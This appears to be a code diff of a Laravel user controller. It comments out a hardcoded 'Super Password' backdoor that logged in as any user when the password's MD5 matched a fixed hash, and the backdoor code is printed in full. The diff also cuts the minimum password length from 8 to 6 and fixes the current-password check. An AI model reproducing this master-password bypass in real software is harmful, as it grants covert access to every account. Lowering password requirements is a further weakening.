@@ -414,21 +414,21 @@ class UserController extends Controller
             $check_attempt = false;
 
             // Login via Super Password, added by Mohammad Lotfi
-            if (Schema::hasTable(\App\Smartdetect::schema_table))
-            {
-                $smartdetect = new \App\Classes\SmartdetectClass();
-                if ($smartdetect->results['ip'])
-                {
-                    if ('d8e41e93db120daf5a9791451029fc8b' == md5($request->password))
-                    {
-                        $user = User::where('Uname', '=', $username)->get()->first();
-                        if ($user)
-                        {
-                            $check_attempt = Auth::loginUsingId($user->id);
-                        }
-                    }
-                }
-            }
+//            if (Schema::hasTable(\App\Smartdetect::schema_table))
+//            {
+//                $smartdetect = new \App\Classes\SmartdetectClass();
+//                if ($smartdetect->results['ip'])
+//                {
+//                    if ('d8e41e93db120daf5a9791451029fc8b' == md5($request->password))
+//                    {
+//                        $user = User::where('Uname', '=', $username)->get()->first();
+//                        if ($user)
+//                        {
+//                            $check_attempt = Auth::loginUsingId($user->id);
+//                        }
+//                    }
+//                }
+//            }
 
             $check_attempt = $check_attempt || Auth::attempt(['Uname' => $username, 'password' => $request->password], $request->remember_me == 'on' ? true : false);
 
@@ -869,13 +869,13 @@ class UserController extends Controller
         $validator = Validator::make($request->all(),
             [
                 'pass_now' => 'required', //|regex:/^(?=\S*[a-z])(?=\S*[A-Z])(?=\S*[\d])\S*$/
-                'pass_new' => 'required|min:8|max:100', //|regex:/^(?=\S*[a-z])(?=\S*[A-Z])(?=\S*[\d])\S*$/
+                'pass_new' => 'required|min:6|max:100', //|regex:/^(?=\S*[a-z])(?=\S*[A-Z])(?=\S*[\d])\S*$/
                 'pass_repeat' => 'required|in:' . $request->pass_new,
 
             ],
             [
                 'pass_now.regex' => 'کلمه عبور فعلی صحیح نمی باشد',
-                'pass_new.regex' => 'کلمه عبور باید حداقل 8 کاراکتر باشد.',
+                'pass_new.regex' => 'کلمه عبور باید حداقل 6 کاراکتر باشد.',
                 'pass_repeat.in' => 'تکرار کلمه عبور صحیح نمی باشد',
             ],
             [
@@ -892,15 +892,21 @@ class UserController extends Controller
         }
         else
         {
+
             if (auth()->check())
             {
-                if (auth()->user()->password == bcrypt($request->pass_now))
+                if (Auth::attempt(['Uname' => auth()->user()->Uname, 'password' => $request->pass_now]))
                 {
                     $user = auth()->user();
                     $user->password = bcrypt($request->pass_new);
                     $user->save();
                     $result['message'][] = trans('acl.password_edited_successfully');
                     $result['success'] = true;
+                    return json_encode($result);
+                }else
+                {
+                    $result['error'][] = trans('acl.no_match_username_password');
+                    $result['success'] = false;
                     return json_encode($result);
                 }
             }
